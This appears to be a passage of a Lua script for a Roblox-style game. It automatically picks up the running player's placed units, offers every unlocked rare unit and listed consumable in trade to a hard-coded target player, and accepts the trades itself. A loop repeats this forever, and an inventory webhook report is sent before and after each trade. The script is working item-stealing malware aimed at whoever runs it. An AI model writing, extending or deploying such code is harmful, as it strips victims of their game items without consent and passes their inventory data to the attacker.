local trade = {
    active=false, phase="Offer", ownOffer={},
    ownReady=false, otherReady=false, ownAccepted=false, otherAccepted=false,
}

S.TradeEvent:Connect(function(name, data)
    if type(name) ~= "string" then return end
    data = type(data) == "table" and data or {}
    if name == "Started" then
        trade.active = true; inTrade = true
        trade.phase = "Offer"; trade.ownOffer = {}
        trade.ownReady, trade.otherReady = false, false
        trade.ownAccepted, trade.otherAccepted = false, false
    elseif name == "Updated" then
        trade.active = true; inTrade = true
        trade.phase = type(data.phase)=="string" and data.phase or "Offer"
        trade.ownOffer = type(data.ownOffer)=="table" and data.ownOffer or {}
        trade.ownReady = data.ownReady == true
        trade.otherReady = data.otherReady == true
        trade.ownAccepted = data.ownAccepted == true
        trade.otherAccepted = data.otherAccepted == true
    elseif name == "Ended" then
        trade.active = false; inTrade = false
        trade.phase = "Offer"; trade.ownOffer = {}
        trade.ownReady, trade.otherReady = false, false
        trade.ownAccepted, trade.otherAccepted = false, false
    end
end)

local function pickupPlacedUnits()
    local slots = getOwnedSlots()
    if type(slots) ~= "table" then return 0 end
    local list = {}
    for n, d in pairs(slots) do
        if type(d) == "table" and d.unitId then
            list[#list+1] = { slot = tonumber(n) or n, data = d }
        end
    end
    table.sort(list, function(a,b) return tonumber(a.slot) < tonumber(b.slot) end)
    local removed = 0
    for _, item in ipairs(list) do
        local r = getRarity(item.data)
        if r and RARITY_FILTER[r] then
            fire(S.InteractSlot, item.slot)
            removed = removed + 1
            task.wait(PICKUP_DELAY)
        end
    end
    if removed > 0 then task.wait(1.5) end
    return removed
end

local function buildOffer()
    local inv = getOwnedEntries()
    if type(inv) ~= "table" then return {} end
    local want = {}
    for _, n in ipairs(CONSUMABLES) do want[n] = true end
    local plan = {}
    for k, e in pairs(inv) do
        if type(k) == "string" and type(e) == "table" and e.name then
            local cfg = EntryRegistry.getEntryConfig(e.name)
            if cfg and cfg.kind == "Unit" then
                local r = getRarity(e)
                if r and RARITY_FILTER[r] then
                    local locked = e.attributes and e.attributes.locked == true
                    if not locked then
                        plan[#plan+1] = { key = k, amount = math.max(1, tonumber(e.amount) or 1) }
                    end
                end
            elseif want[e.name] then
                local amt = tonumber(e.amount) or 0
                if amt > 0 then plan[#plan+1] = { key = k, amount = math.floor(amt) } end
            end
        end
    end
    return plan
end

local function offerMatchesPlan(plan)
    for _, e in ipairs(plan) do
        if (tonumber(trade.ownOffer[e.key]) or 0) < e.amount then return false end
    end
    return true
end

local function pushOneChunk(plan)
    for _, e in ipairs(plan) do
        local have = tonumber(trade.ownOffer[e.key]) or 0
        local missing = e.amount - have
        if missing > 0 then
            local chunk = 1
            for _, step in ipairs({ 1000, 100, 10 }) do
                if missing >= step then chunk = step; break end
            end
            fire(S.ChangeOffer, e.key, chunk)
            return true
        end
    end
    return false
end

local function waitForOfferSync(plan, timeout)
    timeout = timeout or 15
    local deadline = os.clock() + timeout
    local lastPush = 0
    while os.clock() < deadline do
        if offerMatchesPlan(plan) then return true end
        if os.clock() - lastPush >= OFFER_PUSH_DELAY then
            if pushOneChunk(plan) then lastPush = os.clock() else return false end
        end
        task.wait(0.05)
    end
    return false
end

local function holdReady()
    for _ = 1, READY_MAX_RETRIES do
        if trade.ownReady then return true end
        fire(S.AdvanceTrade)
        local dl = os.clock() + READY_RETRY_DELAY
        while os.clock() < dl do
            if trade.ownReady or trade.phase == "Confirm" then return true end
            task.wait(0.1)
        end
    end
    return false
end

local function findTarget()
    for _, p in Players:GetPlayers() do
        if p ~= LocalPlayer
            and (string.lower(p.Name) == string.lower(TARGET_NAME)
                 or string.lower(p.DisplayName) == string.lower(TARGET_NAME))
        then return p end
    end
    return nil
end

local function tradeRound()
    local target
    while not target do
        target = findTarget()
        if not target then task.wait(1) end
    end
    task.wait(2)
    if not target.Parent then return end
    pickupPlacedUnits()
    local plan = buildOffer()
    if #plan == 0 then task.wait(5); return end
    pcall(sendInventoryWebhook, "Pre-Trade")
    fire(S.RequestTrade, target)

    local dl = os.clock() + 10
    while not trade.active and os.clock() < dl do task.wait(0.1) end
    if not trade.active then task.wait(3); return end

    if not waitForOfferSync(plan, 20) then fire(S.CancelTrade); task.wait(3); return end
    task.wait(OFFER_SETTLE_WAIT)
    if not offerMatchesPlan(plan) then
        if not waitForOfferSync(plan, 10) then fire(S.CancelTrade); task.wait(3); return end
    end
    holdReady()

    local pdl = os.clock() + 60
    while not trade.otherReady and os.clock() < pdl do
        if not target.Parent then return end
        if not trade.ownReady and trade.phase ~= "Confirm" then holdReady() end
        task.wait(0.3)
    end
    if trade.phase == "Confirm" then
        for _ = 1, READY_MAX_RETRIES do
            if trade.ownAccepted then break end
            fire(S.AdvanceTrade)
            task.wait(0.5)
        end
    end
    task.wait(2)
    pcall(sendInventoryWebhook, "Post-Trade")
end

--=====================================================================
-- Driver — trade loop runs forever, automatically
--=====================================================================
task.spawn(function()
    while true do
        pcall(tradeRound)
        task.wait(3)
    end
end)
